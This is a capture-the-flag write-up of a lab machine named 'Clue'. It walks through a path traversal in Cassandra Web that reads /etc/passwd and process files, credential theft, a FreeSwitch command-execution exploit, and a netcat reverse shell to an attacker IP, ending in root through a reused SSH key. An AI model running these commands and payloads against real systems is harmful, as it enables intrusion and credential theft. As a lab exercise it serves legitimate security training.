# Clue

## Enumerating Services

First, we'll perform a generic scan to identify the open ports and services running on this machine.

```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.192.240

PORT     STATE  SERVICE          VERSION
22/tcp   open   ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open   http             Apache httpd 2.4.38
|_http-title: 403 Forbidden
3000/tcp open   http             Thin httpd
|_http-title: Cassandra Web
8021/tcp open   freeswitch-event FreeSWITCH mod_event_socket
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumerating port 22

```shell
# Check authentication methods
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22  192.168.192.240

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
```

## Enumerating port 80

We accessed the page through the browser but received a Forbidden error. Enumeration with feroxbuster found a `/backup` directory (also Forbidden).

```shell
# hosts config
sudo nano /etc/hosts
192.168.192.240 clue.com

# Directories Enumeration
feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -d 5 -x php,asp,aspx,html,js,jsp,txt,pdf -C 404,502 -u http://clue.com

http://clue.com/backup
```

## Enumerating port 3000

Navigating to port 3000, we find a Cassandra Web database management application. We found a path traversal exploit (49362) on exploit-db.

The exploit adds dots and slashes to requests, which we exploited with curl following the code's guidelines to find cassie's credentials.

```shell
# Passwd
curl --path-as-is http://clue.com:3000/../../../../../../../../etc/passwd | grep /bin/bash

# Cassandra config files
curl --path-as-is http://clue.com:3000/../../../../../../../../proc/self/cmdline --output -

cassie:SecondBiteTheApple330
```

## Enumerating port 8021

On port 8021 there is a FreeSwitch running. We found an authenticated exploit (47799). Cassie's credentials failed, so we captured FreeSwitch credentials via the path traversal.

```shell
# Capturing FreeSwitch credentials
python3 ./49362.py 192.168.192.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml

# Adding credentials
nano 47799.py
self.PASSWORD = 'StrongClueConEight021'

# Exploiting
chmod +x *
python3 47799.py 192.168.192.240 'id'
```

## Initial Access

After testing different ports for the reverse shell, we found that only port 3000 worked with the simplest payload.

```shell
# Listener
rlwrap -cAra nc -vnlp 3000

# Payload
python3 47799.py 192.168.192.240 'nc 192.168.45.221 3000 -e /bin/bash'

# TTY Upgrade
python -c "import pty;pty.spawn('/bin/bash')"

# Switch to cassie
su cassie # SecondBiteTheApple330
```

## Privilege Escalation

In the directory of the user cassie there was an SSH key. Since she couldn't log in directly, we tested the key with other users and got in as root.

```shell
# Copying id_rsa
cat /home/cassie/id_rsa
nano id_rsa.cassie
chmod 600 id_rsa.cassie

# SSH Connect
ssh -i id_rsa.cassie root@192.168.192.240
```

## Post-Exploitation

With privileged access to the machine we get the flags.

```shell
# Evidences
ip a

cat /var/lib/freeswitch/local.txt
7386a090831bd78236975d4d6cd18e9e

cat /root/proof_youtriedharder.txt
a023a04ee0465574a64e4f27daa1ad82
```
